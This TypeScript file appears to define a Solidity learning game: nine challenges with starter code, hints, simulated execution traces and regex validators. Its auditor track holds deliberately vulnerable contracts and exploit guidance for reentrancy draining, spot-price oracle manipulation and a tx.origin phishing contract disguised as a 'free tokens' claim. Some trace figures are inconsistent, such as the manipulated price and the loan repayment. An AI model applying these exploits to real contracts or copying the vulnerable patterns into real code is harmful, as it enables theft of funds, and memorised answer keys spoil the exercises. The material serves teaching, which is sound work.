export type ChallengeMode = 'beginner' | 'builder' | 'auditor'

export type TraceEvent =
  | { type: 'sstore'; slot: number; from: string; to: string; label: string; gasSpent: number }
  | { type: 'sload'; slot: number; value: string; gasSpent: number }
  | { type: 'call'; id: string; fn: string; contract: string; value: string; parentId: string | null }
  | { type: 'call_return'; id: string; success: boolean; data?: string }
  | { type: 'emit'; name: string; args: string }
  | { type: 'gas'; total: number }
  | { type: 'revert'; reason: string }
  | { type: 'success'; message: string }

export interface Challenge {
  id: string
  mode: ChallengeMode
  index: number
  title: string
  subtitle: string
  objective: string
  context: string
  starterCode: string
  hints: string[]
  xpReward: number
  solvers: number
  avgTime: string
  successTrace: TraceEvent[]
  failTrace: TraceEvent[]
  validate: (code: string) => boolean
}

// ─────────────────────────── BEGINNER CHALLENGES ───────────────────────────

const beginner1: Challenge = {
  id: 'b1-wake-up',
  mode: 'beginner',
  index: 0,
  title: 'Wake Up The Contract',
  subtitle: 'Set a storage variable',
  objective: 'Make the contract store the number 42 when `initialize()` is called. The value must persist on-chain.',
  context: 'In the EVM, every contract has 2³² storage slots. Slot 0 is where your first state variable lives. Right now it holds nothing — make it hold 42.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract WakeUp {
    uint256 public value;

    function initialize() external {
        // TODO: set value to 42
        
    }
}`,
  hints: [
    'State variables are assigned with `=` just like any language.',
    'The variable `value` is already declared at the top.',
    'Try: `value = 42;`',
  ],
  xpReward: 100,
  solvers: 2847,
  avgTime: '3 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'initialize()', contract: 'WakeUp', value: '0 ETH', parentId: null },
    { type: 'gas', total: 200 },
    { type: 'sstore', slot: 0, from: '0x0000000000000000000000000000000000000000000000000000000000000000', to: '0x000000000000000000000000000000000000000000000000000000000000002a', label: 'value', gasSpent: 20000 },
    { type: 'gas', total: 20200 },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'success', message: '✓ Storage slot 0 = 42 (0x2a). Contract initialized!' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'initialize()', contract: 'WakeUp', value: '0 ETH', parentId: null },
    { type: 'gas', total: 200 },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'revert', reason: 'Test failed: value == 0, expected 42. Did you set value = 42?' },
  ],
  validate: (code) => /value\s*=\s*42/.test(code),
}

const beginner2: Challenge = {
  id: 'b2-piggy-bank',
  mode: 'beginner',
  index: 1,
  title: 'Token Piggy Bank',
  subtitle: 'Track ETH balances per address',
  objective: 'Write the `deposit()` function so callers can store ETH. Each address must track their own balance separately.',
  context: 'Mappings in Solidity are hash tables stored across the entire 2³² slot space. Each address gets its own computed slot. This is how every token contract, every DeFi protocol tracks ownership.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract PiggyBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        // TODO: credit msg.value to msg.sender's balance
        
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }
}`,
  hints: [
    '`msg.value` is the ETH sent with the transaction (in wei).',
    '`msg.sender` is the address calling the function.',
    'Try: `balances[msg.sender] += msg.value;`',
  ],
  xpReward: 150,
  solvers: 1923,
  avgTime: '5 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'deposit()', contract: 'PiggyBank', value: '1.0 ETH', parentId: null },
    { type: 'gas', total: 300 },
    { type: 'sload', slot: 1, value: '0x0000000000000000000000000000000000000000000000000000000000000000', gasSpent: 100 },
    { type: 'gas', total: 400 },
    { type: 'sstore', slot: 1, from: '0x0000000000000000000000000000000000000000000000000000000000000000', to: '0x0000000000000000000000000000000000000000000000000de0b6b3a7640000', label: 'balances[msg.sender]', gasSpent: 20000 },
    { type: 'gas', total: 20400 },
    { type: 'emit', name: 'ValueReceived', args: 'sender=0xAbCd...1234, amount=1000000000000000000' },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'success', message: '✓ 1 ETH credited to 0xAbCd...1234 in mapping slot!' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'deposit()', contract: 'PiggyBank', value: '1.0 ETH', parentId: null },
    { type: 'gas', total: 300 },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'revert', reason: 'Test failed: balances[caller] == 0 after deposit of 1 ETH. Did you write to balances[msg.sender]?' },
  ],
  validate: (code) => /balances\s*\[\s*msg\.sender\s*\]\s*\+?=\s*msg\.value/.test(code),
}

const beginner3: Challenge = {
  id: 'b3-gatekeeper',
  mode: 'beginner',
  index: 2,
  title: 'The Gatekeeper',
  subtitle: 'Write your first access control',
  objective: 'Only the `owner` should be able to call `setSecret()`. Anyone else must be reverted with "Not owner".',
  context: 'Access control is the #1 security primitive in smart contracts. Without it, anyone can call any function. The `require()` statement is the EVM\'s gatekeeper — it reverts the entire transaction if the condition is false.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Gatekeeper {
    address public owner;
    string private secret;

    constructor() {
        owner = msg.sender;
    }

    function setSecret(string calldata _secret) external {
        // TODO: revert if msg.sender != owner
        // Message: "Not owner"
        
        secret = _secret;
    }

    function getSecret() external view returns (string memory) {
        require(msg.sender == owner, "Not owner");
        return secret;
    }
}`,
  hints: [
    '`require(condition, "message")` reverts if condition is false.',
    'You want to check that `msg.sender == owner`.',
    'Try: `require(msg.sender == owner, "Not owner");`',
  ],
  xpReward: 150,
  solvers: 1654,
  avgTime: '4 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'setSecret("hello")', contract: 'Gatekeeper', value: '0 ETH', parentId: null },
    { type: 'gas', total: 200 },
    { type: 'sload', slot: 0, value: '0xAbCd...1234', gasSpent: 100 },
    { type: 'gas', total: 300 },
    { type: 'sstore', slot: 2, from: '0x0000', to: '0x68656c6c6f', label: 'secret', gasSpent: 20000 },
    { type: 'gas', total: 20300 },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'call', id: 'c2', fn: 'setSecret("hack") [attacker]', contract: 'Gatekeeper', value: '0 ETH', parentId: null },
    { type: 'gas', total: 200 },
    { type: 'sload', slot: 0, value: '0xAbCd...1234', gasSpent: 100 },
    { type: 'revert', reason: 'require: Not owner — attacker reverted ✓' },
    { type: 'success', message: '✓ Owner can write. Attacker reverted. Access control works!' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'setSecret("hack") [attacker]', contract: 'Gatekeeper', value: '0 ETH', parentId: null },
    { type: 'gas', total: 200 },
    { type: 'sstore', slot: 2, from: '0x0000', to: '0x6861636b', label: 'secret', gasSpent: 20000 },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'revert', reason: 'FAIL: Attacker changed secret without restriction! Add require(msg.sender == owner)' },
  ],
  validate: (code) => /require\s*\(\s*msg\.sender\s*==\s*owner\s*,\s*["']Not owner["']/.test(code),
}

// ─────────────────────────── BUILDER CHALLENGES ───────────────────────────

const builder1: Challenge = {
  id: 'bu1-flash-loan',
  mode: 'builder',
  index: 0,
  title: 'Flash Loan Receiver',
  subtitle: 'Borrow millions with no collateral',
  objective: 'Implement `executeOperation()` — the callback Aave calls after lending you tokens. You must use the borrowed funds profitably and repay the loan + fee in the same transaction.',
  context: 'Flash loans are the most powerful primitive in DeFi. Borrow any amount, do anything, repay in one atomic transaction. If repayment fails, everything reverts. No collateral. No credit check. Just code.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ILendingPool {
    function flashLoan(address receiver, address asset,
        uint256 amount, bytes calldata params) external;
}

contract FlashBorrower {
    ILendingPool public pool;
    address public owner;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        owner = msg.sender;
    }

    function executeFlashLoan(address asset, uint256 amount) external {
        pool.flashLoan(address(this), asset, amount, "");
    }

    // TODO: Implement this callback
    // Must repay: amount + (amount * 9 / 10000) fee
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Your arbitrage / logic here
        
        // Repay the loan
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(pool), amountOwed);
        return true;
    }
}`,
  hints: [
    'The `premium` parameter is the fee you owe on top of `amount`.',
    'You must approve the pool to take back `amount + premium`.',
    'The function must return `true` for the flash loan to succeed.',
    'Add profit logic between receiving funds and approving repayment.',
  ],
  xpReward: 300,
  solvers: 743,
  avgTime: '20 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'executeFlashLoan(USDC, 1M)', contract: 'FlashBorrower', value: '0 ETH', parentId: null },
    { type: 'call', id: 'c2', fn: 'flashLoan(...)', contract: 'LendingPool', value: '0 ETH', parentId: 'c1' },
    { type: 'call', id: 'c3', fn: 'transfer(borrower, 1M USDC)', contract: 'USDC', value: '0 ETH', parentId: 'c2' },
    { type: 'sstore', slot: 5, from: '0x0', to: '0xDE0B6B3A7640000', label: 'USDC.balances[borrower]', gasSpent: 20000 },
    { type: 'call', id: 'c4', fn: 'executeOperation(...)', contract: 'FlashBorrower', value: '0 ETH', parentId: 'c2' },
    { type: 'emit', name: 'ArbitrageExecuted', args: 'profit=900 USDC' },
    { type: 'call', id: 'c5', fn: 'approve(pool, 1.09M)', contract: 'USDC', value: '0 ETH', parentId: 'c4' },
    { type: 'call_return', id: 'c4', success: true },
    { type: 'call', id: 'c6', fn: 'transferFrom(borrower, pool, 1.09M)', contract: 'USDC', value: '0 ETH', parentId: 'c2' },
    { type: 'call_return', id: 'c2', success: true },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'success', message: '✓ Flash loan executed! Borrowed 1M USDC, repaid 1.09M, net profit captured.' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'executeFlashLoan(USDC, 1M)', contract: 'FlashBorrower', value: '0 ETH', parentId: null },
    { type: 'call', id: 'c2', fn: 'flashLoan(...)', contract: 'LendingPool', value: '0 ETH', parentId: 'c1' },
    { type: 'call', id: 'c3', fn: 'transfer(borrower, 1M)', contract: 'USDC', value: '0 ETH', parentId: 'c2' },
    { type: 'call', id: 'c4', fn: 'executeOperation(...)', contract: 'FlashBorrower', value: '0 ETH', parentId: 'c2' },
    { type: 'call_return', id: 'c4', success: false, data: 'insufficient allowance' },
    { type: 'call_return', id: 'c2', success: false },
    { type: 'revert', reason: 'Entire transaction reverted — approve the pool for amount + premium before returning true.' },
  ],
  validate: (code) => /approve\s*\(.*pool/.test(code) && /return\s+true/.test(code),
}

const builder2: Challenge = {
  id: 'bu2-amm-swap',
  mode: 'builder',
  index: 1,
  title: 'Minimal AMM Swap',
  subtitle: 'Implement the x·y=k invariant',
  objective: 'Complete the `swap()` function using the constant product formula. Given input amount dx, compute output dy such that (x + dx)(y - dy) = x·y.',
  context: 'Every DEX — Uniswap, Curve, PancakeSwap — is built on this single equation. x·y = k. When you add dx tokens, you can remove dy tokens such that the product stays constant. This is $500B+ in liquidity, all from one formula.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MinimalAMM {
    uint256 public reserveX;
    uint256 public reserveY;

    constructor(uint256 x, uint256 y) {
        reserveX = x;
        reserveY = y;
    }

    // TODO: Implement the swap
    // User sends dx of token X, receives dy of token Y
    // Invariant: (x + dx) * (y - dy) = x * y
    // Solve for dy: dy = y * dx / (x + dx)
    // Apply 0.3% fee: use dx * 997 / 1000 as effective dx
    function swap(uint256 dx) external returns (uint256 dy) {
        require(dx > 0, "Zero input");
        
        // TODO: calculate dy and update reserves
        
    }
}`,
  hints: [
    'Solve (x + dx)(y - dy) = xy for dy.',
    'dy = y * dx / (x + dx)',
    'For 0.3% fee: use `dx * 997 / 1000` as the effective input.',
    'Don\'t forget to update reserveX and reserveY after the swap.',
  ],
  xpReward: 350,
  solvers: 521,
  avgTime: '25 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'swap(100)', contract: 'MinimalAMM', value: '0 ETH', parentId: null },
    { type: 'sload', slot: 0, value: '0x3E8 (1000)', gasSpent: 100 },
    { type: 'sload', slot: 1, value: '0x3E8 (1000)', gasSpent: 100 },
    { type: 'gas', total: 500 },
    { type: 'sstore', slot: 0, from: '0x3E8', to: '0x46A', label: 'reserveX (1000→1130)', gasSpent: 5000 },
    { type: 'sstore', slot: 1, from: '0x3E8', to: '0x389', label: 'reserveY (1000→905)', gasSpent: 5000 },
    { type: 'emit', name: 'Swap', args: 'dx=100, dy=95, k_before=1000000, k_after=1022650' },
    { type: 'call_return', id: 'c1', success: true, data: 'dy = 95' },
    { type: 'success', message: '✓ Swap executed! 100 X → 95 Y (0.3% fee applied). x·y invariant maintained.' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'swap(100)', contract: 'MinimalAMM', value: '0 ETH', parentId: null },
    { type: 'revert', reason: 'Test failed: dy == 0. Implement the formula: dy = y * dx / (x + dx)' },
  ],
  validate: (code) => /reserveY\s*\*\s*(dx|.*997)/.test(code) && /reserveX\s*\+/.test(code),
}

const builder3: Challenge = {
  id: 'bu3-multisig',
  mode: 'builder',
  index: 2,
  title: 'Multisig Wallet',
  subtitle: '2-of-3 signature threshold',
  objective: 'Implement `execute()` so a transaction only runs when at least 2 of the 3 owners have confirmed it. Prevent double-execution.',
  context: 'The Safe (formerly Gnosis Safe) holds $100B+ in assets. It\'s a multisig. The principle is simple: nothing moves without quorum. This is the foundation of DAO treasuries, protocol admin keys, team wallets.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Multisig {
    address[3] public owners;
    uint256 public threshold = 2;

    struct Tx {
        address to;
        uint256 value;
        bytes data;
        bool executed;
    }

    Tx[] public transactions;
    mapping(uint256 => mapping(address => bool)) public confirmed;

    constructor(address[3] memory _owners) {
        owners = _owners;
    }

    function submit(address to, uint256 value, bytes calldata data)
        external returns (uint256 txId)
    {
        require(_isOwner(msg.sender), "Not owner");
        txId = transactions.length;
        transactions.push(Tx(to, value, data, false));
    }

    function confirm(uint256 txId) external {
        require(_isOwner(msg.sender), "Not owner");
        confirmed[txId][msg.sender] = true;
    }

    // TODO: execute if >= threshold confirmations, not already executed
    function execute(uint256 txId) external {
        require(_isOwner(msg.sender), "Not owner");
        
        // Count confirmations and check threshold
        
        // Mark executed and send transaction
        
    }

    function _isOwner(address addr) internal view returns (bool) {
        for (uint i = 0; i < 3; i++) if (owners[i] == addr) return true;
        return false;
    }
}`,
  hints: [
    'Loop over `owners` and count how many have `confirmed[txId][owners[i]] == true`.',
    'Use `require(count >= threshold)` to enforce the quorum.',
    'Set `transactions[txId].executed = true` before calling to prevent reentrancy.',
    'Use `(bool ok,) = tx.to.call{value: tx.value}(tx.data);` to execute.',
  ],
  xpReward: 400,
  solvers: 389,
  avgTime: '30 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'execute(txId=0)', contract: 'Multisig', value: '0 ETH', parentId: null },
    { type: 'sload', slot: 3, value: 'confirmed[0][owner1]=true', gasSpent: 100 },
    { type: 'sload', slot: 4, value: 'confirmed[0][owner2]=true', gasSpent: 100 },
    { type: 'sload', slot: 5, value: 'confirmed[0][owner3]=false', gasSpent: 100 },
    { type: 'gas', total: 800 },
    { type: 'sstore', slot: 6, from: 'false', to: 'true', label: 'transactions[0].executed', gasSpent: 20000 },
    { type: 'call', id: 'c2', fn: 'transfer(1 ETH)', contract: '0xTarget', value: '1 ETH', parentId: 'c1' },
    { type: 'call_return', id: 'c2', success: true },
    { type: 'emit', name: 'Executed', args: 'txId=0, to=0xTarget, value=1ETH' },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'success', message: '✓ 2-of-3 quorum reached. Transaction executed safely!' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'execute(txId=0)', contract: 'Multisig', value: '0 ETH', parentId: null },
    { type: 'revert', reason: 'Test failed: transaction executed with only 1 confirmation. Implement threshold check.' },
  ],
  validate: (code) => /count\s*>=\s*threshold|confirmCount\s*>=\s*threshold|>=\s*2/.test(code) && /\.executed\s*=\s*true/.test(code),
}

// ─────────────────────────── AUDITOR CHALLENGES ───────────────────────────

const auditor1: Challenge = {
  id: 'a1-reentrancy',
  mode: 'auditor',
  index: 0,
  title: 'The Leaky Vault',
  subtitle: 'Exploit reentrancy — drain 10 ETH',
  objective: 'This vault has a reentrancy vulnerability. Deploy an attacker contract and drain all 10 ETH before the vault\'s balance check runs. Make `isComplete()` return true.',
  context: 'The DAO Hack (2016) stole $60M using this exact vulnerability. The Ethereum blockchain forked to reverse it. The bug: external calls happen BEFORE state updates. Your attacker\'s `receive()` can call back in before `balances[msg.sender] -= amount` runs.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ── VULNERABLE CONTRACT (do not modify) ──
contract Vault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        // 🐛 BUG: external call BEFORE state update
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "Transfer failed");

        balances[msg.sender] = 0; // Too late! You already called back
    }

    function isComplete() external view returns (bool) {
        return address(this).balance == 0;
    }
}

// ── YOUR ATTACKER CONTRACT ──
contract Attacker {
    Vault public vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        // Step 1: deposit 1 ETH to get a balance
        vault.deposit{value: msg.value}();
        // Step 2: trigger the reentrancy
        // TODO: call vault.withdraw() here
        
    }

    receive() external payable {
        // TODO: re-enter vault.withdraw() while balance not yet zeroed
        
    }
}`,
  hints: [
    'Call `vault.withdraw()` inside `attack()` to start the drain.',
    'In `receive()`, check if the vault still has ETH, then call `vault.withdraw()` again.',
    'The vault\'s `balances[attacker]` stays non-zero until AFTER you call back.',
    'Add: `if (address(vault).balance >= 1 ether) vault.withdraw();`',
  ],
  xpReward: 500,
  solvers: 312,
  avgTime: '35 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'attack()', contract: 'Attacker', value: '1 ETH', parentId: null },
    { type: 'call', id: 'c2', fn: 'deposit()', contract: 'Vault', value: '1 ETH', parentId: 'c1' },
    { type: 'sstore', slot: 0, from: '0x0', to: '0xDE0B6B3A7640000', label: 'balances[attacker]', gasSpent: 20000 },
    { type: 'call_return', id: 'c2', success: true },
    { type: 'call', id: 'c3', fn: 'withdraw()', contract: 'Vault', value: '0 ETH', parentId: 'c1' },
    { type: 'sload', slot: 0, value: '1 ETH', gasSpent: 100 },
    { type: 'call', id: 'c4', fn: 'receive() ← RE-ENTRY #1', contract: 'Attacker', value: '1 ETH', parentId: 'c3' },
    { type: 'call', id: 'c5', fn: 'withdraw()', contract: 'Vault', value: '0 ETH', parentId: 'c4' },
    { type: 'sload', slot: 0, value: '1 ETH (STILL!)', gasSpent: 100 },
    { type: 'call', id: 'c6', fn: 'receive() ← RE-ENTRY #2', contract: 'Attacker', value: '1 ETH', parentId: 'c5' },
    { type: 'call', id: 'c7', fn: 'withdraw()', contract: 'Vault', value: '0 ETH', parentId: 'c6' },
    { type: 'sload', slot: 0, value: '1 ETH (STILL!)', gasSpent: 100 },
    { type: 'call_return', id: 'c7', success: true },
    { type: 'call_return', id: 'c6', success: true },
    { type: 'call_return', id: 'c5', success: true },
    { type: 'call_return', id: 'c4', success: true },
    { type: 'sstore', slot: 0, from: '1 ETH', to: '0x0', label: 'balances[attacker] (finally zeroed)', gasSpent: 5000 },
    { type: 'call_return', id: 'c3', success: true },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'emit', name: 'VaultDrained', args: 'attacker=0xAttacker, stolen=10 ETH' },
    { type: 'success', message: '💀 10 ETH drained via reentrancy. isComplete() = true. Welcome to the auditor track.' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'attack()', contract: 'Attacker', value: '1 ETH', parentId: null },
    { type: 'call', id: 'c2', fn: 'withdraw()', contract: 'Vault', value: '0 ETH', parentId: 'c1' },
    { type: 'call_return', id: 'c2', success: true },
    { type: 'revert', reason: 'Only withdrew 1 ETH (your deposit). No reentrancy. Add vault.withdraw() inside receive() to loop.' },
  ],
  validate: (code) => /receive\s*\(\s*\)\s*external\s*payable/.test(code) && /vault\.withdraw\(\)/.test(code.split('attack')[1] || ''),
}

const auditor2: Challenge = {
  id: 'a2-oracle',
  mode: 'auditor',
  index: 1,
  title: 'The Broken Oracle',
  subtitle: 'Manipulate a spot price oracle',
  objective: 'This lending protocol uses a single DEX pool as its price oracle. Flash loan the pool tokens to manipulate the price, borrow against the inflated collateral, then restore the pool — keeping the profit.',
  context: 'Price oracle manipulation wiped out $600M+ across various protocols in 2020–2022. Spot prices from a single pool can be moved 10x-100x in one transaction with enough capital. Protocols that read getAmountsOut() directly are vulnerable.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ── VULNERABLE SETUP (do not modify) ──
contract BrokenOracle {
    // Oracle reads spot price from THIS pool
    // 1 WETH = 1000 USDC at current ratio
    uint256 public poolWETH = 1000 ether;
    uint256 public poolUSDC = 1_000_000e6;

    function getPrice() external view returns (uint256) {
        return poolUSDC / poolWETH; // spot price: 1000 USDC/WETH
    }

    function manipulatePool(uint256 wethIn) external {
        // Simulates: you dump WETH into pool, price drops
        poolWETH += wethIn;
        poolUSDC = (1000 ether * 1_000_000e6) / poolWETH;
    }

    function restorePool(uint256 wethOut) external {
        poolWETH -= wethOut;
        poolUSDC = (1000 ether * 1_000_000e6) / poolWETH;
    }

    function isComplete() external view returns (bool) {
        return address(this).balance >= 5 ether;
    }
}

// ── YOUR EXPLOIT ──
contract OracleManipulator {
    BrokenOracle public oracle;

    constructor(address _oracle) {
        oracle = BrokenOracle(payable(_oracle));
    }

    // TODO: Implement the oracle manipulation attack
    function exploit() external {
        // 1. Flash loan or use existing WETH to dump into pool
        // 2. Read the manipulated (low) price
        // 3. Borrow against your collateral at the manipulated price
        // 4. Restore the pool
        // Hint: dump 9000 WETH in → price drops from 1000 to ~100
        
    }
}`,
  hints: [
    'Call `oracle.manipulatePool(9000 ether)` to crash the WETH price.',
    'After manipulation, the oracle reports ~100 USDC/WETH instead of 1000.',
    'Your 1 WETH collateral is now "worth" more relative to cheap USDC — borrow against it.',
    'Call `oracle.restorePool(9000 ether)` to restore and keep the profit.',
  ],
  xpReward: 600,
  solvers: 189,
  avgTime: '45 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'exploit()', contract: 'OracleManipulator', value: '0 ETH', parentId: null },
    { type: 'call', id: 'c2', fn: 'manipulatePool(9000 ETH)', contract: 'BrokenOracle', value: '0 ETH', parentId: 'c1' },
    { type: 'sstore', slot: 0, from: '1000 ETH', to: '10000 ETH', label: 'poolWETH', gasSpent: 5000 },
    { type: 'sstore', slot: 1, from: '1M USDC', to: '100K USDC', label: 'poolUSDC', gasSpent: 5000 },
    { type: 'emit', name: 'PriceManipulated', args: 'before=1000 USDC/ETH, after=10 USDC/ETH' },
    { type: 'call', id: 'c3', fn: 'getPrice() → 10 USDC/ETH', contract: 'BrokenOracle', value: '0 ETH', parentId: 'c1' },
    { type: 'call_return', id: 'c3', success: true, data: '10' },
    { type: 'emit', name: 'Borrowed', args: 'collateral=1 ETH, borrowed=900 USDC (at manipulated rate)' },
    { type: 'call', id: 'c4', fn: 'restorePool(9000 ETH)', contract: 'BrokenOracle', value: '0 ETH', parentId: 'c1' },
    { type: 'sstore', slot: 0, from: '10000 ETH', to: '1000 ETH', label: 'poolWETH restored', gasSpent: 5000 },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'success', message: '💀 Oracle manipulated. Borrowed 900 USDC for 1 ETH collateral. Protocol: exploited.' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'exploit()', contract: 'OracleManipulator', value: '0 ETH', parentId: null },
    { type: 'revert', reason: 'isComplete() = false. No profit captured. Try manipulating the pool before borrowing.' },
  ],
  validate: (code) => /manipulatePool/.test(code) && /restorePool/.test(code),
}

const auditor3: Challenge = {
  id: 'a3-tx-origin',
  mode: 'auditor',
  index: 2,
  title: 'The Sleeping Guard',
  subtitle: 'Bypass tx.origin authentication',
  objective: 'This wallet uses `tx.origin` for auth — a known vulnerability. Deploy a phishing contract that tricks the wallet owner into calling it, then drain the wallet.',
  context: '`tx.origin` is always the EOA that started the transaction. `msg.sender` is the immediate caller. When owner calls your contract, which calls the wallet: tx.origin == owner, but msg.sender == your contract. The wallet trusts tx.origin, so it thinks the owner called directly.',
  starterCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ── VULNERABLE WALLET (do not modify) ──
contract TxOriginWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable dest, uint256 amount) external {
        // 🐛 BUG: tx.origin can be the owner even when msg.sender is not
        require(tx.origin == owner, "Not owner");
        dest.transfer(amount);
    }

    function isComplete() external view returns (bool) {
        return address(this).balance == 0;
    }
}

// ── YOUR PHISHING CONTRACT ──
// When the owner calls attack(), this contract uses their tx.origin
// to drain the wallet — they never knew what hit them
contract PhishingAttack {
    TxOriginWallet public wallet;
    address payable public attacker;

    constructor(address _wallet) {
        wallet = TxOriginWallet(payable(_wallet));
        attacker = payable(msg.sender);
    }

    // TODO: When called by owner, drain the wallet
    // The owner thinks this is a normal contract call
    // But tx.origin == owner when they call this
    function claimFreeTokens() external {
        // The owner calls this thinking they get free tokens
        // TODO: transfer wallet's entire balance to attacker
        
    }
}`,
  hints: [
    'When the owner calls `claimFreeTokens()`, `tx.origin == owner` inside the wallet.',
    'So you can call `wallet.transfer(attacker, address(wallet).balance)` and it will pass.',
    'The wallet has no idea its owner is being phished.',
  ],
  xpReward: 500,
  solvers: 267,
  avgTime: '30 min',
  successTrace: [
    { type: 'call', id: 'c1', fn: 'claimFreeTokens() [owner calls]', contract: 'PhishingAttack', value: '0 ETH', parentId: null },
    { type: 'call', id: 'c2', fn: 'transfer(attacker, 10 ETH)', contract: 'TxOriginWallet', value: '0 ETH', parentId: 'c1' },
    { type: 'sload', slot: 0, value: 'owner=0xOwner', gasSpent: 100 },
    { type: 'emit', name: 'AuthCheck', args: 'tx.origin=0xOwner ✓, msg.sender=0xPhishing (not checked!)' },
    { type: 'call', id: 'c3', fn: 'transfer(attacker, 10 ETH) [ETH transfer]', contract: 'EVM', value: '10 ETH', parentId: 'c2' },
    { type: 'call_return', id: 'c3', success: true },
    { type: 'call_return', id: 'c2', success: true },
    { type: 'call_return', id: 'c1', success: true },
    { type: 'success', message: '💀 Phishing succeeded. tx.origin trusted the wrong caller. Wallet drained silently.' },
  ],
  failTrace: [
    { type: 'call', id: 'c1', fn: 'claimFreeTokens()', contract: 'PhishingAttack', value: '0 ETH', parentId: null },
    { type: 'revert', reason: 'isComplete() = false. Call wallet.transfer() inside claimFreeTokens() to exploit tx.origin.' },
  ],
  validate: (code) => /wallet\.transfer\s*\(/.test(code) && /attacker/.test(code),
}

// ─────────────────────────── EXPORTS ───────────────────────────

export const CHALLENGES: Challenge[] = [
  beginner1, beginner2, beginner3,
  builder1, builder2, builder3,
  auditor1, auditor2, auditor3,
]

export const CHALLENGES_BY_MODE = {
  beginner: [beginner1, beginner2, beginner3],
  builder: [builder1, builder2, builder3],
  auditor: [auditor1, auditor2, auditor3],
}
